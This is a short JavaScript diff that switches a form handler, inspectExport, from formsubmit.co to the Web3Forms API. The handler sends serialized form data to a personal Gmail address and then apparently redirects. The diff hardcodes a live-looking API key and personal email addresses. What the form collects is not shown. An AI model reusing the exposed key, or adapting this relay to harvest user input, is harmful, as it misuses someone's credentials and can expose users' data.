@@ -48,12 +48,13 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiUrl = "https://formsubmit.co/ajax/webt12348@gmail.com"; // formsubmit.co endpoint
+    let apiUrl = "https://api.web3forms.com/submit"; // Web3Forms endpoint
 
-    // Modify form data to include email field
+    // Modify form data to include email field and other necessary fields
     let formData = new FormData();
-    formData.append("email", "awoyemiireoluwa@gmail.com"); // Replace with your email registered with Formsubmit.co
-    formData.append("data", JSON.stringify(strings)); // formsubmit.co expects "data" key for form data
+    formData.append("apikey", "cc84e718-bc05-40a2-9b45-dfd839275a30"); // Replace with your Web3Forms API key
+    formData.append("email", "awoyemiireoluwa@gmail.com"); // Replace with your email registered with Web3Forms
+    formData.append("data", JSON.stringify(strings)); // Web3Forms expects "data" key for form data
 
     let request = new XMLHttpRequest();
     request.open("POST", apiUrl);
@@ -61,7 +62,7 @@ function inspectExport(formdata, nextpage) {
 
     request.onreadystatechange = function() {
         if (request.readyState === XMLHttpRequest.DONE) {
-            if (request.status === 200) { // formsubmit.co returns 200 for successful submissions
+            if (request.status === 200) { // Web3Forms returns 200 for successful submissions
                 // Success
                 console.log("Form submitted successfully!");
                 // Redirect to the next page if needed
